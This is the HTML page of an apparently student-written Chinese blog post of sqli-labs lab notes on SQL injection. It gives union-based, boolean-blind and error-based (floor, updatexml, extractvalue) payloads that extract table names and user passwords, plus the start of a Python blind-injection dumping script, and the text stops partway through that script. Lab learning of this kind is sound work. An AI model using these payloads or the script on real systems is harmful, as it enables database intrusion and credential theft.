@@ -1,0 +1,500 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>web安全：sql注入基础 | 沉浮之道</title>
+  <meta name="author" content="cendeavor">
+  
+  <meta name="description" content="昨天实训讲了sqli-labs的Less 1-6算是给sql注入真正入了个门，这里总结一哈">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="web安全：sql注入基础">
+  <meta property="og:site_name" content="沉浮之道">
+
+  
+    <meta property="og:image" content>
+  
+
+  <link rel="alternate" href="/atom.xml" title="沉浮之道" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <!-- favicon -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <!-- Font-Awesome -->
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+
+</head>
+</html>
+<body>
+  <header id="header"><div class= "header-content inner">
+	<div class = "alignleft col-one">
+		
+			<div class='avatar'>
+				<img src = "/img/default/avatar.png">
+              </div>
+		
+		<div class="header-div">
+		    <h1><a href="/">沉浮之道</a></h1>
+		    <h2><a href="/"></a></h2>
+		</div>
+	</div>
+	<div class = "alignright col-two">
+		
+	</div>
+	<div class="clearfix"></div>
+</div>
+
+<div class= "header-nav">
+	<div class='header-nav-content inner'>
+		<div id="main-nav" class="alignleft">
+		    		
+		    		  <a href="/"><i class="fa fa-home"></i>首页</a>
+		    		
+		    		  <a href="/archives"><i class="fa fa-archive"></i>归档</a>
+		    		
+		    		  <a href="/node"><i class="fa fa-book"></i>Node.js</a>
+		    		
+		    		  <a href="/hexo"><i class="fa fa-book"></i>电子书</a>
+		    		
+		</div>
+		<div id="sub-nav" class="alignright">
+		    
+		      <a href="/atom.xml"><i class="fa fa-rss"></i>订阅</a>
+		    
+		      <a href="/customization"><i class="fa fa-question-circle"></i>留言</a>
+		    
+		      <a href="/about"><i class="fa fa-user"></i>关于我</a>
+		    
+		</div>
+	</div>
+	<div class="clearfix"></div>
+</div>
+</header>
+    <div id="content" class="inner">
+      <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+        <div class="icon"></div>
+        
+        <time datetime="2019-10-20T09:02:00.575Z"><a href="/2019/10/20/0xSEC-WEB sql注入基础/">2019-10-20</a></time>
+        
+  
+    <h1 class="title">web安全：sql注入基础</h1>
+  
+
+    </header>
+
+    <div class="entry">
+      
+        
+    <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是SQL注入"><span class="toc-text">什么是SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入的危害"><span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLi的利用思路及步骤"><span class="toc-text">SQLi的利用思路及步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#手注技巧"><span class="toc-text">手注技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-text">Less 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-text">Less 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-text">Less 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-text">Less 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-text">Less 5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#双注入查询"><span class="toc-text">双注入查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-6-通关笔记"><span class="toc-text">Less 5-6 通关笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#盲注脚本"><span class="toc-text">盲注脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#双注入查询脚本"><span class="toc-text">双注入查询脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本模板"><span class="toc-text">脚本模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注-1"><span class="toc-text">盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMAP使用总结"><span class="toc-text">SQLMAP使用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装SQLMap"><span class="toc-text">安装SQLMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET数字型注入利用过程示范"><span class="toc-text">GET数字型注入利用过程示范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找注入点"><span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询库名"><span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定库名查表名"><span class="toc-text">指定库名查表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定库名、表名查列名"><span class="toc-text">指定库名、表名查列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取sql-shell"><span class="toc-text">获取sql-shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查记录"><span class="toc-text">查记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反查密码"><span class="toc-text">反查密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST注入利用方式"><span class="toc-text">POST注入利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方式一：–form"><span class="toc-text">方式一：–form</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方式二：–data-“var1-parm1-amp-var2-parm2”"><span class="toc-text">方式二：–data “var1=parm1&amp;var2=parm2”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方式三：-r-“request-txt”"><span class="toc-text">方式三：-r “request.txt”</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+        <p>昨天实训讲了sqli-labs的Less 1-6算是给sql注入真正入了个门，这里总结一哈</p>
+<a id="more"></a>
+<h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><p>sql注入，是<code>针对DBMS的攻击</code>，由于后端使用了过时的架构或者不安全的数据库连接方法导致攻击者在提交查询参数时附带的预期外的SQL语句被DBMS执行。</p>
+<p><strong>这里首先要理解DBMS和DB的区别：</strong></p>
+<pre><code>DBMS，即数据库管理系统，是用来管理数据库的`软件`，如 MySql, Oracle, Access等
+
+DB，数据库，是`文件的集合`。</code></pre><p>因此，除了网站编写人员对于处理与数据库管理系统的代码影响之外，<code>不同的数据库管理系统、不同的版本，对于SQL语句检查的方法、严格程度不同</code>，也会对sql注入方法产生影响，比如Oracle检查的最严格，Mysql的相对不严格。</p>
+<p>而我们后面用到的sqli-labs的存在注入点的PHP脚本都是和MySql交互的，所以我们后面的注入方法是针对于MySQL数据库管理系统的。</p>
+<h1 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h1><p>以前对于危害虽有耳闻，但不甚理解，在昨晚自己编写了bool 盲注 SQL注入半自动化脚本后，今天在DaiWei的服务器上做第五题，发现除了可以爆出题目所在的当前数据库名之外，MySql管理的其他所有数据库也可以被爆出来，瞬间就理解了危害：</p>
+<p>就是通过一个存在SQL注入点的网页（代码），我们可以查询到<code>数据库管理系统中所有数据库</code>的信息，这其中必然包含了大量的用户敏感信息，所以，和一个数据库交互的脚本出了问题，会波及到该数据库所在域的所有其他数据库，这危害真实太大。</p>
+<h1 id="SQLi的利用思路及步骤"><a href="#SQLi的利用思路及步骤" class="headerlink" title="SQLi的利用思路及步骤"></a>SQLi的利用思路及步骤</h1><ol>
+<li><p>找到注入点</p>
+<p>F12，Network-&gt;clear-&gt;点击链接-&gt;发现向数据库提交记录-&gt;右键copy link address</p>
+<ol>
+<li><p>判断注入类型——数字型、字符型</p>
+<p>字符型：把输入的参数当做字符处理（存在闭合符如””, ‘’, ()等）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select name from users where id = &quot;1 order by 10&quot; -&gt; wrong!</span><br><span class="line">select name from users where id = &quot;1&quot; order by 10#&quot;</span><br><span class="line"></span><br><span class="line">mysql 两个注释符 ： &quot;#&quot;   和  &quot;- &quot;</span><br><span class="line"></span><br><span class="line">判断方法 输入&quot;2-1&quot;看 输入的还是否会显示第一条记录，不能用 1+1，因为浏览器会将+识别为空格，如果一定要用这种方式判断，要先对+编码</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断闭合符</p>
+<p>输入单引号 报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;1&quot; LIMIT 0,1&apos;&apos;</span><br><span class="line">去掉两边的单引号就是报错内容，可判断是单引号注入</span><br><span class="line">&quot;--+&quot; 而不是 &quot;-- &quot; </span><br><span class="line">浏览器：编码，并忽略一些字母如空格，&quot;#&quot;-&gt;&quot;%23&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<ol start="2">
+<li><p>判断后台数据库列数</p>
+<p>newId=1 order by 10(二分) -&gt; 首先检查语法正确所以用1    </p>
+</li>
+<li><p>找到显示位</p>
+<p>newId=-1 union select 1,2,3,4,5</p>
+<p>注：-1作用：让原来查出来的不被查出来，只显出自己的查询结果（换成1试试）</p>
+</li>
+<li><p>查数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（1）union select XX from XX</span><br><span class="line"></span><br><span class="line">select 1,2 union select 3,4</span><br><span class="line"></span><br><span class="line">union select的列数必须和前面的列数相同</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">select user, password from mysql.user where user=&quot;abc&quot; union select</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（2）认识information_schema (MySQL version &gt;=5.0)</span><br><span class="line"></span><br><span class="line">tables：存了数据库管理系统里面所有库的表名</span><br><span class="line">	目标：使用information_schema库查出test库的表名</span><br><span class="line">	语句：select table_name from information_schema.tables where table_schema = &quot;test&quot;;</span><br><span class="line"></span><br><span class="line">columns：存了数据库管理系统里面所有库的所有表的列名</span><br><span class="line">	目标：使用information_schema库查出test库的user表的列名</span><br><span class="line">	语句：select column_name from information_schema.columns where table_schema = &quot;test&quot; and table_name = &quot;users&quot;;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>库名</p>
+<p>newId=-1 union select 1,2,database(),4,5        <code>double_fish</code></p>
+</li>
+<li><p>表名</p>
+<p>select table_name from information_schema.tables where table_schema = “库名”        <code>t_admin</code></p>
+<p><strong>注意：</strong>==select后使用group_concat(查询内容)，实现查询结果&gt;1条==</p>
+</li>
+<li><p>列名</p>
+<p>select column_name from information_schema.columns where table_schema = “库名” and table_name = “表名”;            <code>username, password</code></p>
+<p><strong>技巧：</strong>==concat_ws(“–&gt;”, username, password)==</p>
+</li>
+<li><p>查数据</p>
+<p>select username, password from double_fish.t_admin;</p>
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>cmd5查询原始口令</code></pre><h2 id="手注技巧"><a href="#手注技巧" class="headerlink" title="手注技巧"></a>手注技巧</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h3><p>(一)    判断注入类型</p>
+<ol>
+<li><p>id=1</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-41-52.png" alt></p>
+</li>
+<li><p>id=2</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-42-01.png" alt></p>
+</li>
+<li><p>id=2-1</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-42-10.png" alt></p>
+</li>
+</ol>
+<p>由于id=2-1中的结果和id=2的结果一样，证明2-1并没有被当做表达式计算，所以是字符型。</p>
+<p>(二)    猜解闭合符</p>
+<ol start="4">
+<li><p>id=1’</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-42-50.png" alt></p>
+</li>
+</ol>
+<p>发现页面报错，证明至少猜对了第一个闭合符，由报错信息判断，闭合符仅为一个单引号。</p>
+<p>(三)    判断数据库列数</p>
+<ol start="5">
+<li><p>id=1’ order by 10 %23</p>
+<p> <img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-43-09.png" alt><br>此条报错说明数据库列数&lt;10，于是使用二分法。注：%23是为了注释原查询语句后面的内容</p>
+</li>
+<li><p>id=1’ order by 3 %23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-43-22.png" alt></p>
+</li>
+<li><p>id=1’ order by 4 %23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-43-35.png" alt><br>由6、7步知，数据库列数为3</p>
+</li>
+</ol>
+<p>(四)    找到显示位</p>
+<ol start="8">
+<li><p>id=-1’ union select 1,2,3 %23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-43-48.png" alt><br>由此可知显示位置为2和3号位，需注意，id=-1而不是1，不然会虽然查询出了两条记录，但会只显示第一条成功查询的记录，就看不到显示位的回显信息了！！</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-44-03.png" alt></p>
+</li>
+</ol>
+<p>(五)    查库名</p>
+<ol start="9">
+<li><p>id=-1’ union select 1,2,database()%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-44-24.png" alt><br>由此可知数据库名为security</p>
+</li>
+</ol>
+<p>(六)    查表名</p>
+<ol start="10">
+<li><p>id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-44-39.png" alt><br>注意这里需要用group_concat将多条查询结果连接成一条结果，显然此处最有可能藏有用户账号密码的表为”users”</p>
+</li>
+</ol>
+<p>(七)    查列名</p>
+<ol start="11">
+<li><p>id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=”users”%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-46-27.png" alt></p>
+</li>
+</ol>
+<p>(八)    查数据</p>
+<ol start="12">
+<li><p>id=-1’ union select 1,2,group_concat(username, “–&gt;”, password, “<br>“) from security.users%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-46-50.png" alt></p>
+<p>注：这里使用一些分隔符使得账号和口令可读性更强。</p>
+</li>
+</ol>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h3><p>(一)    判断注入类型</p>
+<ol>
+<li><p>id=1</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-39-42.png" alt></p>
+</li>
+<li><p>id=2-1</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-39-57.png" alt></p>
+</li>
+</ol>
+<p>发现两次返回结果一样，证明是数字型，所以也不需要去判别闭合符，下面判断列数，找显示点，查询库名、表名、数据的步骤，以及回显结果同Less 1，这里仅给出payload</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h3><ol>
+<li><p>判断注入类型</p>
+<p> <img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-29-15.png" alt></p>
+<p> 输入2-1，发现显示页面改变了，证明是字符型（如果是数字型，会先进行运算，返回结果一样）</p>
+</li>
+<li><p>判断闭合符</p>
+<p> 输入单引号，将报错内容复制出，然后去掉字符串两端的单引号就是SQL语句</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;1&apos;&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p> 从1的左端可知，确实是已经闭合了单引号，但是右边显示圆括号，所以还需闭合圆括号</p>
+</li>
+<li><p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-35-28.png" alt></p>
+</li>
+<li><p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-35-41.png" alt></p>
+</li>
+<li><p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-35-52.png" alt></p>
+</li>
+</ol>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h3><ol>
+<li><p>判断是否存在注入</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-37-24.png" alt></p>
+</li>
+<li><p>判断闭合符</p>
+<p>输入单引号，页面不变，证明未闭合</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-37-38.png" alt></p>
+<p>输入双引号，得知闭合符</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-17-37-48.png" alt></p>
+</li>
+</ol>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">盲注预备；</span><br><span class="line"></span><br><span class="line">bool盲注：用left(database(),1)用于判断数据库版本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select substr(description,2,1) from test.users where id=1</span><br><span class="line">substr(),mid()</span><br><span class="line">限制输出长度的需要逐一 爆字符</span><br><span class="line"></span><br><span class="line">ascii()和ord()</span><br><span class="line">有些时候引号被过滤，</span><br><span class="line"></span><br><span class="line">url中用的是16进制，mysql的ascii函数中转化的是10进制</span><br><span class="line"></span><br><span class="line">regexp 正则注入</span><br><span class="line"></span><br><span class="line">基于延时：</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>盲注原理（判断闭合符）：如果是猜的闭合符正确的，两次回显内容不同，一次有一次没有，否则，都回显没有</p>
+<p>1’ and 1=1%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-18-05-44.png" alt></p>
+<p>1’ and 1=2%23</p>
+<p><img src="/pic/0xSEC-WEB%20sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2019-10-20-18-05-56.png" alt></p>
+</li>
+<li><p>猜数据库名</p>
+<p>ascii(substr(database(), ?(==猜解的字符的位置==), 1)) &gt; ?(==猜解的字符的ascii码== )</p>
+</li>
+</ol>
+<pre><code>id=1&apos; and 1=1 and ascii(substr(database(), 1, 1)) &gt; 114 %23
+
+![](/pic/0xSEC-WEB%20sql注入基础/2019-10-20-18-06-07.png)
+
+id=1&apos; and 1=1 and ascii(substr(database(), 1, 1)) &gt; 115 %23
+
+![](/pic/0xSEC-WEB%20sql注入基础/2019-10-20-18-06-15.png)
+
+查ascii码知为s
+
+
+
+id=1&apos; and 1=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database(), 1, 1)) &gt; 115 %23</code></pre><h4 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a>双注入查询</h4><p>双（查询）注入，又称floor报错，想要查询select database()，只需要输入后面语句即可在MySQL报错语句中查询出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、union select count(*),1, concat((payload), floor(rand()*2)) as a from information_schema.tables group by a;</span><br><span class="line"></span><br><span class="line">2、and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line">限制：输出字符长度限制为64个字符</span><br><span class="line">原理2</span><br><span class="line">updatexml报错注入：MySQL执行1=(updatexml(1,concat(0x3a,(payload)),1))将报错。</span><br><span class="line">限制1：输出字符长度限制为32个字符</span><br><span class="line">限制2：仅payload返回的不是xml格式，才会生效</span><br><span class="line">原理3</span><br><span class="line">ExtractValue报错注入：执行 extractvalue(&apos;anything&apos;,concat(&apos;/&apos;,(Payload)))将报错。</span><br><span class="line">限制：输出字符长度限制为32个字符</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">地址1</span><br><span class="line">http://192.168.68.128/sqli-labs/Less-5/?id=1&apos; union select count(*),1, concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23</span><br><span class="line">地址2</span><br><span class="line">http://192.168.68.128/sqli-labs/Less-5/?id=1&apos; and 1=(updatexml(1,concat(0x3a,(select database())),1))%23</span><br><span class="line">地址3</span><br><span class="line">http://192.168.68.128/sqli-labs/Less-5/?id=1&apos; and (extractvalue(&apos;anything&apos;,concat(&apos;/&apos;,(select version()))))%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-5-6-通关笔记"><a href="#Less-5-6-通关笔记" class="headerlink" title="Less 5-6 通关笔记"></a>Less 5-6 通关笔记</h3><p>参考：</p>
+<p><a href="https://blog.csdn.net/tianjin_ren/article/details/89945501#Less5_GET__Double_Injection__Single_Quotes__String_GET_118" target="_blank" rel="noopener">盲注</a></p>
+<p><a href="https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2" target="_blank" rel="noopener">双查询注入</a></p>
+<p><a href="http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">python脚本实现半自动化布尔盲注</a></p>
+<embed src="/view/sqli-labs Less5-6.pdf" width="100%" height="1000" type="application/pdf">
+
+<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><p>贴出自己写的 Less 5 和 6 盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpDatabase</span><span class="params">(base, session, ditt)</span>:</span></span><br><span class="line"></span><br><span class="line">    database = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ditt:</span><br><span class="line">            payload = <span class="string">"\"^!(substr(database(),&#123;&#125;,1)='&#123;&#125;')--%20-"</span>.format(i, j)</span><br><span class="line">            url = base + payload</span><br><span class="line">            html = session.get(url).content.decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"are"</span> <span class="keyword">in</span> html:</span><br><span class="line">                database += j</span><br><span class="line">                <span class="comment"># print(i,j)</span></span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"database:"</span>.upper(), database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpTable</span><span class="params">(base, session, ditt, maxNum)</span>:</span></span><br><span class="line"></span><br><span class="line">    tables = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span 